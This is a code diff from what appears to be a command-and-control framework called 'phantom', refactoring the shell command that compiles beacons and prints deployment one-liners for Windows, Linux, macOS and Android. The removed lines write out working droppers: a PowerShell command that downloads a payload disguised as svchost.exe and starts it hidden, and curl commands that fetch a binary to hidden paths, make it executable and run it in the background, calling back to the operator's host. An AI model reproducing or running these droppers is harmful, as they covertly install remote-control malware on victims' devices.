@@ -167,130 +167,65 @@ class C2Shell(cmd.Cmd):
                 platform = "windows"
                 notifier.info("Detected Windows target from scan results. Defaulting to 'windows'.")
             else:
-                platform = "windows" # Global default
+                # No clear detection — ask the user interactively (arrow keys) if possible
+                import sys
+                valid_platforms_local = ["windows", "linux", "macos", "android"]
+                if sys.stdin.isatty():
+                    try:
+                        from phantom.utils.interactive import select_option
+                        choice = select_option("No platform detected. Select platform:", valid_platforms_local, default_index=0)
+                    except Exception:
+                        choice = None
+
+                    if choice:
+                        platform = choice
+                    else:
+                        notifier.warn("No platform selected; aborting generation.")
+                        return
+                else:
+                    notifier.warn("No platform detected and non-interactive session. Defaulting to 'windows'.")
+                    platform = "windows"
         
         valid_platforms = ["windows", "linux", "macos", "android"]
         if platform not in valid_platforms:
             notifier.error(f"Invalid platform. Choose from: {', '.join(valid_platforms)}")
             return
         
+        from phantom.utils.builder import compile_beacon, generate_dropper
+        from phantom.utils.payload_manager import add_custom_beacon
+
         import phantom
         pkg_root = os.path.dirname(phantom.__file__)
-        beacon_dir = os.path.join(pkg_root, "payloads", "beacon")
         host = get_lhost()
         port = server_instance.port if (server_instance.thread and server_instance.thread.is_alive()) else 443
-        
-        if platform == "windows":
-            beacon_out = os.path.join(beacon_dir, "beacon.exe")
-            if not os.path.exists(beacon_out):
-                console.print("[yellow][*] Compiling beacon for Windows...[/yellow]")
-                try:
-                    if os.name == 'nt':
-                        if not shutil.which("cl"):
-                            notifier.error("'cl.exe' (MSVC) not found in PATH. Run from Developer Command Prompt or install Build Tools.")
-                            return
-                        subprocess.run(
-                            ["cl", "/EHsc", "/O2", "/std:c++17", "src/main.cpp", "/Fe:beacon.exe",
-                             "/link", "winhttp.lib", "bcrypt.lib", "ws2_32.lib", "/SUBSYSTEM:WINDOWS"],
-                            cwd=beacon_dir, check=True, capture_output=True, text=True)
-                    else:
-                        mingw_cpp = "x86_64-w64-mingw32-g++"
-                        if not shutil.which(mingw_cpp):
-                            notifier.error(f"'{mingw_cpp}' not found. To build for Windows from Linux, run:")
-                            console.print(f"[bold cyan]    sudo apt update && sudo apt install -y mingw-w64[/]")
-                            return
-                        subprocess.run(
-                            [mingw_cpp, "-std=c++17", "-O2", "-s", "-o", "beacon.exe",
-                             "src/main.cpp", "-lwinhttp", "-lbcrypt", "-lws2_32", "-static"],
-                            cwd=beacon_dir, check=True, capture_output=True, text=True)
-                    notifier.success("Windows beacon compiled.")
-                except subprocess.CalledProcessError as e:
-                    notifier.error(f"Compilation failed:\n{e.stderr}")
-                    return
-                except Exception as e:
-                    notifier.error(f"Unexpected error: {e}")
-                    return
-            
-            url = f"http://{host}:{port}/api/v1/payload"
-            dropper = f"Invoke-WebRequest -Uri {url} -OutFile $env:TEMP\\svchost.exe; Start-Process $env:TEMP\\svchost.exe -ArgumentList '{host} {port}' -WindowStyle Hidden"
-            console.print(Panel(dropper, title="[bold green]PowerShell Dropper (Windows)[/]", border_style="green"))
-        
-        elif platform == "linux":
-            beacon_out = os.path.join(beacon_dir, "beacon_linux")
-            if not os.path.exists(beacon_out):
-                console.print("[yellow][*] Compiling beacon for Linux...[/yellow]")
-                try:
-                    if not shutil.which("g++"):
-                        notifier.error("'g++' not found. Install build-essential, libcurl4-openssl-dev, and libssl-dev:")
-                        console.print("[bold cyan]    sudo apt update && sudo apt install -y build-essential libcurl4-openssl-dev libssl-dev[/]")
-                        return
-                    subprocess.run(
-                        ["g++", "-std=c++17", "-O2", "-s", "-o", "beacon_linux", "src/main.cpp",
-                         "-lcurl", "-lssl", "-lcrypto", "-lpthread"],
-                        cwd=beacon_dir, check=True, capture_output=True, text=True)
-                    notifier.success("Linux beacon compiled.")
-                except subprocess.CalledProcessError as e:
-                    notifier.error(f"Compilation failed:\n{e.stderr}")
-                    return
-                except Exception as e:
-                    notifier.error(f"Unexpected error: {e}")
-                    return
-            
-            url = f"http://{host}:{port}/api/v1/payload_linux"
-            dropper = f"curl -s {url} -o /tmp/.phantom && chmod +x /tmp/.phantom && nohup /tmp/.phantom {host} {port} &>/dev/null &"
-            console.print(Panel(dropper, title="[bold cyan]Bash Dropper (Linux)[/]", border_style="cyan"))
-        
-        elif platform == "macos":
-            beacon_out = os.path.join(beacon_dir, "beacon_macos")
-            if not os.path.exists(beacon_out):
-                console.print("[yellow][*] Compiling beacon for macOS...[/yellow]")
-                try:
-                    if not shutil.which("clang++"):
-                        notifier.error("'clang++' not found. Install Xcode Command Line Tools.")
-                        return
-                    subprocess.run(
-                        ["clang++", "-std=c++17", "-O2", "-o", "beacon_macos", "src/main.cpp",
-                         "-lcurl", "-lssl", "-lcrypto", "-lpthread", "-framework", "CoreGraphics"],
-                        cwd=beacon_dir, check=True, capture_output=True, text=True)
-                    notifier.success("macOS beacon compiled.")
-                except subprocess.CalledProcessError as e:
-                    notifier.error(f"Compilation failed:\n{e.stderr}")
-                    console.print("[dim]Ensure Xcode Command Line Tools, curl, and openssl are installed.[/dim]")
-                    return
-                except Exception as e:
-                    notifier.error(f"Unexpected error: {e}")
-                    return
-            
-            url = f"http://{host}:{port}/api/v1/payload_macos"
-            dropper = f"curl -s {url} -o /tmp/.phantom && chmod +x /tmp/.phantom && nohup /tmp/.phantom {host} {port} &>/dev/null &"
-            console.print(Panel(dropper, title="[bold yellow]Bash Dropper (macOS)[/]", border_style="yellow"))
-        
-        elif platform == "android":
-            beacon_out = os.path.join(beacon_dir, "beacon_android")
-            if not os.path.exists(beacon_out):
-                console.print("[yellow][*] Compiling beacon for Android (ARM64)...[/yellow]")
-                ndk_cc = os.environ.get("ANDROID_NDK_CC", "aarch64-linux-android28-clang++")
-                if not shutil.which(ndk_cc):
-                    notifier.error(f"Android NDK compiler '{ndk_cc}' not found. Set ANDROID_NDK_CC.")
-                    return
-                try:
-                    subprocess.run(
-                        [ndk_cc, "-std=c++17", "-O2", "-s", "-o", "beacon_android", "src/main.cpp",
-                         "-lcurl", "-lssl", "-lcrypto", "-static"],
-                        cwd=beacon_dir, check=True, capture_output=True, text=True)
-                    notifier.success("Android beacon compiled.")
-                except subprocess.CalledProcessError as e:
-                    notifier.error(f"Compilation failed:\n{e.stderr}")
-                    console.print("[dim]Ensure Android NDK is installed and ANDROID_NDK_CC is set correctly.[/dim]")
-                    return
-                except Exception as e:
-                    notifier.error(f"Unexpected error: {e}")
-                    return
-            
-            url = f"http://{host}:{port}/api/v1/payload_android"
-            dropper = f"curl -s {url} -o /data/local/tmp/.phantom && chmod +x /data/local/tmp/.phantom && /data/local/tmp/.phantom {host} {port} &"
-            console.print(Panel(dropper, title="[bold red]ADB Dropper (Android)[/]", border_style="red"))
-        
+
+        # Compile and generate dropper
+        beacon_path = compile_beacon(platform, pkg_root)
+        if not beacon_path:
+            return
+
+        dropper = generate_dropper(platform, host, port)
+        if not dropper:
+            notifier.error(f"Failed to generate dropper for {platform}")
+            return
+
+        # Display and Register
+        title_map = {
+            "windows": "PowerShell Dropper (Windows)",
+            "linux": "Bash Dropper (Linux)",
+            "macos": "Bash Dropper (macOS)",
+            "android": "ADB Dropper (Android)"
+        }
+        style_map = {
+            "windows": "green",
+            "linux": "cyan",
+            "macos": "yellow",
+            "android": "red"
+        }
+
+        console.print(Panel(dropper, title=f"[bold {style_map.get(platform, 'white')}]{title_map.get(platform, 'Dropper')}[/]", border_style=style_map.get(platform, "white")))
+        add_custom_beacon(platform, dropper, "Custom C++ Beacon", source="c2_shell")
+
         notifier.info("Run the above command on the target to deploy the beacon.")
 
     def do_exit(self, arg):
